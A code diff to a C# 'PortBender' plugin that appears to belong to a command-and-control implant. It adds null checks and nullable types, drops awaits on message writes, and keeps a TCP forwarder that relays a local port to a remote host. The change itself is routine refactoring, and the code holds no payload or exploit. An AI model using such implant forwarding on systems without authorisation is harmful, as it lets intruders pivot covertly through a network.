@@ -14,8 +14,8 @@ namespace Agent
         private IMessageManager messageManager { get; set; }
         private bool running = false;
         private string start_task = String.Empty;
-        private TcpForwarderSlim fwdr;
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        private TcpForwarderSlim? fwdr;
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
         }
@@ -23,12 +23,20 @@ namespace Agent
         public async Task Execute(ServerJob job)
         {
             PortBenderArgs args = JsonSerializer.Deserialize<PortBenderArgs>(job.task.parameters);
+            if(args is null){
+                return;
+            }
+
             if (running)
             {
+                if(fwdr is null){
+                    return;
+                }
+                
                 fwdr.Stop();
                 running = false;
-                await messageManager.WriteLine($"Listener Stopped.", start_task, true);
-                await messageManager.WriteLine($"Listener Stopped.", job.task.id, true);
+                messageManager.WriteLine($"Listener Stopped.", start_task, true);
+                messageManager.WriteLine($"Listener Stopped.", job.task.id, true);
                 return;
             }
             string host = args.destination.Split(':')[0];
@@ -37,7 +45,7 @@ namespace Agent
 
             if (!int.TryParse(sPort, out port))
             {
-                await messageManager.WriteLine($"Failed to get destination port.", job.task.id, true, "error");
+                messageManager.WriteLine($"Failed to get destination port.", job.task.id, true, "error");
                 return;
             }
 
@@ -51,7 +59,7 @@ namespace Agent
                 }
                 catch (Exception ex)
                 {
-                    await messageManager.WriteLine($"Failed to resolve host: {ex.Message}", job.task.id, true, "error");
+                    messageManager.WriteLine($"Failed to resolve host: {ex.Message}", job.task.id, true, "error");
                     return;
                 }
             }
@@ -62,11 +70,11 @@ namespace Agent
 
             this.fwdr = new TcpForwarderSlim();
 
-            Task.Run(() => fwdr.Start(local, remote));
+            _ = Task.Run(() => fwdr.Start(local, remote));
             start_task = job.task.id;
             running = true;
 
-            await messageManager.WriteLine($"Started Listener.", job.task.id, true);
+            messageManager.WriteLine($"Started Listener.", job.task.id, true);
         }
     }
 }
